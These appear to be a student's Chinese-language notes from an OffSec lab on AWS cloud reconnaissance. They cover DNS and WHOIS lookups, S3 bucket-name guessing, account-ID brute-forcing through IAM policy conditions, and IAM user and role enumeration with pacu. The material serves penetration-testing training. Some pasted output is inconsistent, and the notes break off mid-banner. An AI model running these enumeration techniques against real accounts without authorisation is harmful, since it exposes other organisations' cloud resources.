>[!Important]
>Shadow Copy vs. 其他 AD Persistence\
>![image](https://hackmd.io/_uploads/SJFSESe2Je.png)

# Enumerating AWS Cloud Infrastructure
[Cloud Service Provider](https://csrc.nist.gov/glossary/term/cloud_provider) (CSP): 雲端服務供應商\
AWS（[Amazon Web Services](https://aws.amazon.com/what-is-aws/)）雲端基礎設施的 Enumeration

## About the Public Cloud Labs
OffSec 提供了 Public Cloud Labs 給學員使用，最多十個小時。\
並提醒學員：「當個好駭客」\
![image](https://hackmd.io/_uploads/rJTTPFe3Jg.png)

## Reconnaissance of Cloud Resources on the Internet
-  [NIST Definition of Cloud Computing Model](https://nvlpubs.nist.gov/nistpubs/legacy/sp/nistspecialpublication800-145.pdf) 

識別可公開存取的雲端資源，以及 發掘錯誤配置導致的目標，先做 External Reconnaissance ，還不需要使用 CSP API 蒐集資訊。
### Accessing the Lab
部署 Cloud Labs、設定 DNS，模擬環境中做 Cloud Reconnaissance。
Labs 不會對 real published domain 做其他事情，內部會部署自訂的 public DNS。
#### 1. 修改 /etc/resolv.conf
將 DNS Server IP 新增 Lab 提供的 public DNS Server IP\
在 DNS 查詢時，會先嘗試使用 Lab 的 DNS 伺服器
```
┌──(chw㉿CHW)-[~]
└─$ cat /etc/resolv.conf
# Generated by NetworkManager
nameserver {LAB DNS Server IP}
nameserver 1.1.1.1
```
#### 2. 測試 DNS 設定
##### 2.1 手動指定 DNS 伺服器進行查詢
目標網域是 `www.offseclab.io`，使用 `host` 指令來測試
```
┌──(chw㉿CHW)-[~]
└─$ host www.offseclab.io {LAB DNS Server IP}   
Using domain server:
Name: {LAB DNS Server IP}
Address: {LAB DNS Server IP}#53
Aliases: 

www.offseclab.io has address {LAB IP}
```
##### 2.2 不指定 DNS 伺服器進行查詢
確認我們的本機 DNS 設定正確
```
┌──(chw㉿CHW)-[~]
└─$ host www.offseclab.io           
www.offseclab.io has address {LAB IP}
```
#### - 清除與重置 DNS 設定
##### [Way 1] 手動移除 DNS 設定
```
┌──(chw㉿CHW)-[~]
└─$ cat /etc/resolv.conf
# Generated by NetworkManager
nameserver 1.1.1.1
```
##### [Way 2] 重啟 NetworkManager
```
┌──(chw㉿CHW)-[~]
└─$ sudo systemctl restart NetworkManager
                                                                                                
┌──(chw㉿CHW)-[~]
└─$ cat /etc/resolv.conf
# Generated by NetworkManager
nameserver 1.1.1.1
```
### Domain and Subdomain Reconnaissance
External Reconnaissance : 主要探討 Domain, Subdomain 偵察技術，透過 DNS 查詢、WHOIS 資訊、反向 DNS 解析。
#### Domain Reconnaissance
##### 1. 查詢目標的 DNS 伺服器（Name Server）
找出 offseclab.io 的 authoritative DNS servers\
name servers  包含該網域的所有 record
```
┌──(chw㉿CHW)-[~]
└─$ host -t ns offseclab.io
offseclab.io name server ns-512.awsdns-00.net.
offseclab.io name server ns-0.awsdns-00.com.
offseclab.io name server ns-1536.awsdns-00.co.uk.
offseclab.io name server ns-1024.awsdns-00.org.
```
>`-t ns`: 指定查詢 NS（Name Server）記錄

##### 2. 確認 AWS 託管的資訊
使用 whois 查詢其中 NS 伺服器的註冊資訊
```
┌──(chw㉿CHW)-[~]
└─$ whois awsdns-00.com | grep "Registrant Organization"
Registrant Organization: Amazon Technologies, Inc.
```
> 確定 `offseclab.io` 網域由 AWS 管理，🥚 不代表該企業的所有基礎設施都在 AWS 上

##### 3. 查找網域的公開 IP
使用 host 來查詢 www.offseclab.io 對應的 公開 IP
```
┌──(chw㉿CHW)-[~]
└─$ host www.offseclab.io
www.offseclab.io has address {LAB Public IP}
```
> 分析 這個 IP 是否屬於 AWS

##### 4. 查詢 IP 來源
使用 whois 查詢該 IP
```
┌──(chw㉿CHW)-[~]
└─$ whois {LAB Public IP} | grep "OrgName"
OrgName:        Amazon Technologies Inc.
```
>  IP 屬於 AWS（Amazon Technologies Inc.），代表 該網站的伺服器可能是 AWS EC2（[Elastic Compute Cloud](https://aws.amazon.com/ec2/?nc2=h_ql_prod_fs_ec2)）執行個體。\
>  有可能使用 [Route53](https://aws.amazon.com/route53/) service

>[!Tip]
>The EC2 instance is a virtual machine in the AWS cloud. EC2 is a common service used to host websites, applications, and other services that require a server.

##### 5. 反向 DNS 解析
使用 host 查詢該 IP 的 Reverse DNS Lookup
```
┌──(chw㉿CHW)-[~]
└─$ host {LAB Public IP}                                       
....in-addr.arpa domain name pointer ec2-....compute-1.amazonaws.com.
```
> `compute-1.amazonaws.com`表示 這個 IP 來自 AWS EC2 執行個體。

#### Subdomain Reconnaissance
##### 使用 dnsenum 來自動枚舉 Subdomain
```
┌──(chw㉿CHW)-[~]
└─$ dnsenum offseclab.io --threads 100
dnsenum VERSION:1.2.6

-----   offseclab.io   -----


Host's addresses:
__________________

offseclab.io.                            60       IN    A        52.70.117.69

Name Servers:
______________

ns-1536.awsdns-00.co.uk.                 0        IN    A        205.251.198.0
ns-0.awsdns-00.com.                      0        IN    A        205.251.192.0
ns-512.awsdns-00.net.                    0        IN    A        205.251.194.0
ns-1024.awsdns-00.org.                   0        IN    A        205.251.196.0


Mail (MX) Servers:
___________________



Trying Zone Transfers and getting Bind Versions:
_________________________________________________

Trying Zone Transfer for offseclab.io on ns-512.awsdns-00.net ...
AXFR record query failed: corrupt packet

Trying Zone Transfer for offseclab.io on ns-1024.awsdns-00.org ...
AXFR record query failed: corrupt packet

Trying Zone Transfer for offseclab.io on ns-0.awsdns-00.com ...
AXFR record query failed: corrupt packet

Trying Zone Transfer for offseclab.io on ns-1536.awsdns-00.co.uk ...
AXFR record query failed: corrupt packet


Brute forcing with /usr/share/dnsenum/dns.txt:
_______________________________________________
mail.offseclab.io.                       60       IN    A        52.70.117.69
www.offseclab.io.                        60       IN    A        52.70.117.69
...
```
> `--threads 100`: 增加請求 DNS 的 thread

>[!Tip]
>Mail Exchanger: `host -t mx offseclab.io`\
>TXT(SPF): `host -t txt offseclab.io`, `dig txt offseclab.io +short`,`nslookup -type=txt offseclab.io`

### Service-specific Domains
透過雲端服務的 Service-specific Domains 來偵察企業的雲端資源，利用 CSP 命名規則 來尋找公開資源。
#### 1. 識別目標企業使用的雲端資源
上一章節透過 反向 DNS 查詢 確認了目標 `offseclab.io` 是 託管在 AWS EC2 上
- 分析網站的請求資源（如 CSS、JS、圖片）
- 尋找與 AWS 相關的資源（如 S3 Bucket）
- 嘗試枚舉更多 AWS 服務，特別是 S3 Bucket

#### 2. 透過網站分析 AWS 資源
瀏覽器瀏覽：  http://www.offseclab.io\
![image](https://hackmd.io/_uploads/HyBtu5ehye.png)
##### 2.1 Developer Tools
建議直接看 Browser 原廠的 document
- [Firefox document](https://firefox-dev.tools/)
- [Chrome document](https://developer.chrome.com/docs/devtools?hl=zh-tw)

網站載入時，會請求許多靜態檔案，如：stylesheet files (`.css`), script files (`.js`), images (`.png`, `.jpg`) 與其他外部 API 或 CDN 請求
##### 2.2 發現 AWS S3 相關資源
某些圖片來自 s3.amazonaws.com，這代表這些圖片 存放在 AWS S3 Bucket，例如：\
`https://s3.amazonaws.com/offseclab-assets-public-axevtewi/sites/www/images/amethyst.png`
> `s3.amazonaws.com`: AWS S3 Bucket\
`offseclab-assets-public-axevtewi`: S3 Bucket 名稱\
`sites/www/images/amethyst.png`: 物件的路徑

#### 3. 嘗試列出 S3 Bucket 內容
找到的 S3 儲存桶 offseclab-assets-public-axevtewi：
- 測試該 Bucket 是否允許公開列出所有檔案
- 確認是否有其他潛在敏感資訊存放其中
##### 3.1 直接存取 S3 Bucket
瀏覽 `http://s3.amazonaws.com/offseclab-assets-public-axevtewi/` S3 Bucket
>[!Tip]
>正常應該要回傳：Access Denied ，代表 Bucket 設為 Private\
>但回傳了 XML (可能包含敏感資訊)\
>> 若你直接瀏覽上面網址，會顯示 `NoSuchBucket`\
>> 以上只是網址範例

![image](https://hackmd.io/_uploads/H1zUn9lhye.png)

##### 3.2 Enumerate 更多 S3 Bucket
透過 Bucket 命名方式: `offseclab-assets-public-axevtewi`
猜測路徑：
```
offseclab-assets-public-axevtewi
offseclab-assets-private-axevtewi
offseclab-assets-dev-axevtewi
offseclab-assets-prod-axevtewi
offseclab-assets-development-axevtewi
offseclab-assets-production-axevtewi
```
private 路徑顯示 `Access Denied`
![image](https://hackmd.io/_uploads/HydET5xhyx.png)
> 表示 bucket 存在，但沒有 public read permission

##### 3.3 透過自動化工具 Enumeration
Already-built tool: `cloudbrute` or `cloud-enum`
```
┌──(chw㉿CHW)-[~]
└─$ cloud_enum --help          
┌──(chw㉿CHW)-[~]
└─$ cloud_enum -k offseclab-assets-public-axevtewi --quickscan --disable-azure --disable-gcp
```
>`-k offseclab-assets-public-axevtewi`：指定要搜尋的關鍵字（S3 Bucket Name）\
`--quickscan`：啟用快速掃描模式\
`--disable-azure`：禁用 Azure 相關掃描\
`--disable-gcp`：禁用 GCP 相關掃描

自訂 keyword：
```
┌──(chw㉿CHW)-[~]
└─$ for key in "public" "private" "dev" "prod" "development" "production"; do echo "offseclab-assets-$key-axevtewi"; done | tee /tmp/keyfile.txt
┌──(chw㉿CHW)-[~]
└─$ cloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp
```
#### 4. 其他雲端服務的標準命名規則
![image](https://hackmd.io/_uploads/r1YZ1ilnkl.png)

## Reconnaissance via Cloud Service Provider's API
透過 Cloud Service Provider 的 API 進行 Reconnaissance
>[!Note]
>管理 AWS 雲端環境內的使用者及其權限的服務稱為: [Identity and Access Management](https://aws.amazon.com/iam/?nc=sn&loc=1)，也稱為 IAM

- 從公開資源獲取資訊
例如公開的 S3 Bucket、Lambda 函數、ECR（Elastic Container Registry）映像等。
- 從公開的 S3 Bucket 中獲取帳戶 ID
S3 Bucket 的某些資訊可能暴露 AWS 帳戶 ID。
- 列舉（Enumerate）其他帳戶的 IAM 使用者
嘗試識別 目標 AWS 帳戶下的 IAM 使用者，這可能會暴露企業內部的角色、權限、甚至 API 金鑰。
### Preparing the Lab - Configure AWS CLI
#### 1. 安裝 AWS CLI
```
┌──(chw㉿CHW)-[~]
└─$ sudo apt update
┌──(chw㉿CHW)-[~]
└─$ sudo apt install -y awscli
...
```
確認安裝
```
aws --version
```
#### 2. 配置 AWS CLI
使用 Lab 提供的 AWS Access Key 和 Secret Access Key 來與 AWS API 互動，使用 AWS CLI 來測試 AWS API 的存取權限\
設定 AWS profile 並確認憑證有效
```
┌──(chw㉿CHW)-[~]
└─$ aws configure --profile attacker
AWS Access Key ID [None]: {Access Key Id}
AWS Secret Access Key [None]: {Access Key Secret}
Default region name [None]: us-east-1
Default output format [None]: json
                                    
┌──(chw㉿CHW)-[~]
└─$ aws --profile attacker sts get-caller-identity
{
    "UserId": "{Access Key Id}",
    "Account": "{Account ID}",
    "Arn": "arn:aws:iam::{Account ID}:user/attacker"
}
```
>`Account`：AWS 帳戶 ID\
`Arn`：使用者完整的 AWS ARN（Amazon Resource Name）

- 列出攻擊者能存取的 S3 Bucket
`aws --profile attacker s3 ls`
- 列舉 IAM 使用者
`aws --profile attacker iam list-users`
- 查詢 IAM 權限
`aws --profile attacker iam get-user`

### Publicly Shared Resources
透過 AWS API 探索公開共享的雲端資源，特別是 AMIs（[Amazon Machine Images](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/AMIs.html)）、EBS（[Elastic Block Storage](https://aws.amazon.com/ebs/)）snapshots 和 RDS（[Relational Database Service](https://aws.amazon.com/rds/)）snapshots。
#### 1. 搜尋 AWS 上的公開 AMIs
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile attacker ec2 describe-images --owners amazon --executable-users all
{
    "Images": [
        {
            "PlatformDetails": "Linux/UNIX",
            "UsageOperation": "RunInstances",
            "BlockDeviceMappings": [
                   ...
               ],
            "Description": "EKS Auto Node AMI (variant: neuron, k8s: 1.31)",
            "EnaSupport": true,
            "Hypervisor": "xen",
            "ImageOwnerAlias": "amazon",
            "Name": "eks-auto-neuron-1.31-x86_64-20241214",
            "RootDeviceName": "/dev/xvda",
            "RootDeviceType": "ebs",
            "SriovNetSupport": "simple",
            "VirtualizationType": "hvm",
            "BootMode": "uefi-preferred",
            "DeprecationTime": "2026-12-14T05:06:13.000Z",
            "SourceImageId": "ami-0a070504d78aa3105",
            "SourceImageRegion": "us-west-2",
            "ImageId": "ami-00eda206fc827fd26",
            "ImageLocation": "amazon/eks-auto-neuron-1.31-x86_64-20241214",
            "State": "available",
            "OwnerId": "992382739861",
            "CreationDate": "2024-12-14T05:06:13.000Z",
            "Public": true,
            "Architecture": "x86_64",
            "ImageType": "machine"
...

```
>`ec2 describe-images`: 列出該帳戶可以讀取的所有圖像
>`--owners amazon`: 只顯示 AWS 官方 AMI\
`--executable-users all`: 所有公開 AMI
>> `ImageId`： AMI 的唯一識別碼，可以用來啟動 EC2 伺服器\
`Public: true`：代表個 AMI 是公開的\
`OwnerId`：AMI 的擁有者（AWS 帳戶 ID）

#### 2. 搜尋目標企業（offseclab.io）相關的 AMI
找出可能屬於 offseclab.io 的 AMI
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile attacker ec2 describe-images --executable-users all --filters "Name=description,Values=*Offseclab*"

{
    "Images": []
}

```
> 可能是因為該企業 沒有在描述欄位中標示 Offseclab

根據 AMI 的名稱（Name）搜尋
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile attacker ec2 describe-images --executable-users all --filters "Name=name,Values=*Offseclab*"
{
    "Images": [
        {
            "Architecture": "x86_64",
            "CreationDate": "2023-08-05T19:43:29.000Z",
            "ImageId": "ami-0854d94958c0a17e6",
            "ImageLocation": "123456789012/Offseclab Base AMI",
            "ImageType": "machine",
            "Public": true,
            "OwnerId": "123456789012",
            "PlatformDetails": "Linux/UNIX",
            "UsageOperation": "RunInstances",
            "State": "available",
            "BlockDeviceMappings": [
                {
                    "DeviceName": "/dev/xvda",
                    "Ebs": {
                        "DeleteOnTermination": true,
                {
                    "DeviceName": "/dev/xvda",
                    "Ebs": {
                        "DeleteOnTermination": true,
                        "DeleteOnTermination": true,
                        "SnapshotId": "snap-098dc18c797e4f255",
                        "VolumeSize": 8,
                        "VolumeType": "gp2",
                        "Encrypted": false
                    }
                }
            ],
            "EnaSupport": true,
            "Hypervisor": "xen",
            "Name": "Offseclab Base AMI",
            "RootDeviceName": "/dev/xvda"
            ...
```
>`OwnerId: "123456789012"`: 企業的 AWS 帳戶 ID，之後可以用這個帳戶 ID 搜索更多相關資源。

#### 3. 搜尋 AWS 上的公開 EBS snapshots
EBS（Elastic Block Storage）是一種 雲端虛擬磁碟，可用來存放 EC2 伺服器的資料
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile attacker ec2 describe-snapshots --filters "Name=description,Values=*offseclab*"

{
    "Snapshots": []
}
```
>沒有發現公開的 EBS snapshots

#### 4. 搜尋 AWS 上的公開 RDS snapshots
AWS RDS 允許企業 建立資料庫快照，以備份和還原資料庫
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile attacker rds describe-db-snapshots --snapshot-type public

{
    "DBSnapshots": []
}
```
>沒有找到公開的 RDS 快照
### Obtaining Account IDs from S3 Buckets
透過 AWS S3 API 來獲取目標 AWS 帳戶 ID\
如果無法透過公開的 AWS 資源（如 AMI、EBS snapshot）直接獲得 AWS 帳戶 ID：
- 如果目標帳戶擁有一個公開可讀的 S3 bucket（例如 `offseclab-assets-public-*`），可以利用 S3 API 來獲取帳戶 ID
- AWS 帳戶不應該能夠讀取該 S3 bucket 的內部內容，但我們可以濫用 IAM 政策（Policy）的 Condition 限制，來進行 字典攻擊（Brute Force）帳戶 ID。

>[!Tip]
AWS 帳戶 ID 由 12 位數字組成，例如：`123456789012`\
可以通過測試不同的第一個數字（0-9）來逐步推測完整的帳戶 ID。

攻擊流程：
- 尋找公開的 S3 bucket（例如 `offseclab-assets-public-*`）。
- 建立一個新的 IAM 使用者 enum，該使用者 默認沒有權限。
- 創建 IAM 政策來限制 enum 使用者的權限，僅當 S3 bucket 的擁有者帳戶 ID 符合條件時才允許存取。
- 測試不同的帳戶 ID 前綴，當條件正確時，就可以成功讀取 S3 儲存桶的內容。
- 根據返回結果，逐步確定完整的 AWS 帳戶 ID。

![gif](https://hackmd.io/_uploads/HymHLv-2yg.gif)

#### 1. 找到公開的 S3 bucket
尋找 公開可讀的 S3 bucket\
使用 curl 來從 `www.offseclab.io` 網站的圖片 URL 提取 bucket 名稱
```
┌──(chw㉿CHW)-[~]
└─$ curl -s www.offseclab.io | grep -o -P 'offseclab-assets-public-\w{8}'
offseclab-assets-public-kaykoour
offseclab-assets-public-kaykoour
offseclab-assets-public-kaykoour
offseclab-assets-public-kaykoour
```
> 找到了名為 `offseclab-assets-public-kaykoour` 的 S3 bucket

驗證 S3 儲存桶是否可讀:
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile attacker s3 ls offseclab-assets-public-kaykoour
                           PRE sites/
```
> 允許 公開列出內容

#### 2. 建立新 IAM 使用者 `chw`
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile attacker iam create-user --user-name chw 
{
    "User": {
        "Path": "/",
        "UserName": "chw",
        "UserId": "AIDAQOMAIGYU4HTPEJ32K",
        "Arn": "arn:aws:iam::123456789012:user/chw",
    }
}

```
> 該使用者默認沒有任何權限，因此無法存取 S3 bucket

為 chw 使用者建立存取金鑰（Access Key）:
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile attacker iam create-access-key --user-name chw 
{
    "AccessKey": {
        "UserName": "chw",
        "AccessKeyId": "{Access Key Id}",
        "Status": "Active",
        "SecretAccessKey": "{Access Key Secret}",
    }
}
```
#### 3. 在 AWS CLI 配置 chw 使用者
```
┌──(chw㉿CHW)-[~]
└─$ aws configure --profile chw     
AWS Access Key ID [None]: {Access Key Id}
AWS Secret Access Key [None]: {Access Key Secret}
Default region name [None]: us-east-1
Default output format [None]: json
                                                                                                
┌──(chw㉿CHW)-[~]
└─$ aws sts get-caller-identity --profile enum

The config profile (enum) could not be found
                                                                                                
┌──(chw㉿CHW)-[~]
└─$ aws sts get-caller-identity --profile chw 
{
    "UserId": "AIDATPFQY6ZPQYTNIGPNK",
    "Account": "{Account ID}",
    "Arn": "arn:aws:iam::{Account ID}:user/chw"
}

```
測試 chw 使用者的權限:
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile chw s3 ls offseclab-assets-private-kaykoour


An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist
```
> 證明 chw 目前沒有足夠權限來存取 bucket

![gif](https://hackmd.io/_uploads/r1FnFwbnyg.png)
#### 4. 創建 IAM policy 來進行帳戶 ID 枚舉
創建一個 IAM policy（policy-s3-read.json）
```
┌──(chw㉿CHW)-[~]
└─$ cat policy-s3-read.json                                              
{
     "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowResourceAccount",
            "Effect": "Allow",
            "Action": [
                "s3:ListBucket",
                "s3:GetObject"
            ],
            "Resource": "*",
            "Condition": {
                "StringLike": {"s3:ResourceAccount": ["0*"]}
            }
        }
    ]
}
```
> 當 S3 儲存桶的擁有者帳戶 ID 以 0 開頭時，chw 使用者才被允許存取

附加 IAM policy 給 chw
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile attacker iam put-user-policy \
--user-name chw \      
--policy-name s3-read \
--policy-document file://policy-s3-read.json

┌──(chw㉿CHW)-[~]
└─$ aws --profile attacker iam list-user-policies --user-name chw 
{
    "PolicyNames": [
        "s3-read"
    ]
}
``` 
嘗試讀取 S3 bucket
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile enum s3 ls offseclab-assets-private-kaykoour

The config profile (enum) could not be found
```
>代表 帳戶 ID 不是以 0 開頭

#### 4. 編輯 IAM policy 測試
修改 policy-s3-read.json，將條件改成 1*：\
`"StringLike": {"s3:ResourceAccount": ["1*"]}`\
重新附加到 chw:
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile attacker iam put-user-policy \
--user-name chw \      
--policy-name s3-read \
--policy-document file://policy-s3-read.json
```
>若 `1*` 成功了

持續測試下一個位元
```
- __"StringLike": {"s3:ResourceAccount": ["10*"]}__
- __"StringLike": {"s3:ResourceAccount": ["11*"]}__
...
- __"StringLike": {"s3:ResourceAccount": ["18*"]}__
- __"StringLike": {"s3:ResourceAccount": ["19*"]}__
```
### Enumerating IAM Users in Other Accounts
透過 AWS API 濫用 IAM 設定來 enumerate 目標 AWS 帳戶內的 IAM 使用者與角色\
可以透過 建立 S3 Bucket 授權策略 或 濫用 AssumeRole 設定 測試是否存在特定 IAM 使用者或角色
- 利用 AWS API 濫用 IAM 設定，檢測某個 AWS 帳戶內的 IAM 使用者與角色是否存在。
- 測試 IAM 使用者是否存在的方法：
    - 建立 S3 Bucket，並嘗試對目標帳戶內的特定 IAM 使用者授權。
    - 如果授權成功，代表該 IAM 使用者存在；如果失敗，則代表使用者不存在。
- 測試 IAM 角色是否存在的方法：
    - 利用 AssumeRole API 來測試特定角色是否存在。
    - 如果 API 回應錯誤，表示該角色不存在。

#### 1. IAM 設定與 Principal 欄位
在 AWS 中，當設定 IAM 權限時，可以透過 Principal 屬性來定義哪些 AWS 帳戶或 IAM 身份（使用者/角色）能夠存取該資源
```
"Principal": {
  "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]
}
```
> `AccountID`: AWS 帳戶 ID，例如 123456789012\
`user/cloudadmin`: IAM 使用者名稱 cloudadmin

#### 2. 列舉 IAM 使用者
##### 2.1 創建一個新的 S3 bucket
在 attacker user 的 AWS 帳戶 中創建一個 S3 bucket
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile attacker s3 mb s3://offseclab-dummy-bucket-$RANDOM-$RANDOM-$RANDOM

make_bucket: offseclab-dummy-bucket-3319-18105-13817
```
>`offseclab-dummy-bucket-3319-18105-13817`

##### 2.2 設定 S3 授權策略
設定 一個 S3 IAM Policy，授權特定 AWS 帳戶內的 IAM 使用者讀取該 S3 Bucket
建立 `grant-s3-bucket-read.json`:
```
┌──(chw㉿CHW)-[~]
└─$ cat grant-s3-bucket-read.json 
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowUserToListBucket",
            "Effect": "Allow",
            "Resource": "arn:aws:s3:::offseclab-dummy-bucket-3319-18105-13817",
            "Principal": {
                "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]
            },
            "Action": "s3:ListBucket"

        }
    ]
}
```
> 如果 cloudadmin 使用者存在，該策略將能夠成功應用到 S3 Bucket；如果該使用者 不存在，AWS 會返回錯誤訊息

##### 2.3 套用 S3 IAM 授權策略
```
┌──(chw㉿CHW)-[~]
└─$ aws --profile attacker s3api put-bucket-policy \
    --bucket offseclab-dummy-bucket-3319-18105-13817 \ 
    --policy file://grant-s3-bucket-read.json

An error occurred (MalformedPolicy) when calling the PutBucketPolicy operation: Invalid principal in policy
```
> error: 代表不存在 cloudadmin

透過 自動化測試不同的 IAM 使用者名稱，可以逐步確認 目標帳戶內存在哪些 IAM 使用者

#### 3. 列舉 IAM 角色
##### 3.1  建立可能的 IAM 角色名稱清單
```
┌──(chw㉿CHW)-[~]
└─$ echo -n "lab_admin
security_auditor
content_creator
student_access
lab_builder
instructor
network_config
monitoring_logging
backup_restore
content_editor" > /tmp/role-names.txt
```
##### 3.2 使用 pacu 工具自動化測試
- 安裝 pacu
```
sudo apt update
sudo apt install pacu
```
- 啟動 pacu
```
┌──(chw㉿CHW)-[~]
└─$ pacu               
No database found at /home/chw/.local/share/pacu/sqlite.db
Database created at /home/chw/.local/share/pacu/sqlite.db


 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡿⠛⠉⠁⠀⠀⠈⠙⠻⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⡿⣿⣿⣷⣦⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣈⣉⣙⣛⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠿⢿⣿⣷⣦⣄⠀⠀⠈⠛⠋⠀⠀⠀⠈⠻⣿⣷⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣈⣉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⣀⣀⣤⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣆⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣬⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢛⣉⣉⣡⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣶⣄⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣁⣤⣶⡿⣿⣿⠉⠻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢻⣿⣧⡀
 ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣠⣶⣿⡟⠻⣿⠃⠈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣧
 ⢀⣀⣤⣴⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⢠⣾⣿⠉⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
 ⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡟
 ⠀⠀⠀⠀⠉⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁
 ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⣴⣆⢀⣴⣆⠀⣼⣆⠀⠀⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⠿⠋⠀⠀
 ⠀⠀⠀⣼⣿⣿⣿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠓⠒⠒⠚⠛⠛⠛⠛⠛⠛⠛⠛⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀
 ⠀⠀⠀⣿⣿⠟⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣶⡀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣷⡄⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⣆⠀⢰⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠘⠁⠀⠀⠀⢸⣿⣿⡿⠛⠛⢻⣿⣿⡇⠀⢸⣿⣿⡿⠛⠛⢿⣿⣿⡇⠀⢸⣿⣿⡿⠛⠛⢻⣿⣿⣿⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠸⠿⠿⠟⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣧⣤⣤⣼⣿⣿⡇⠀⢸⣿⣿⣧⣤⣤⣼⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
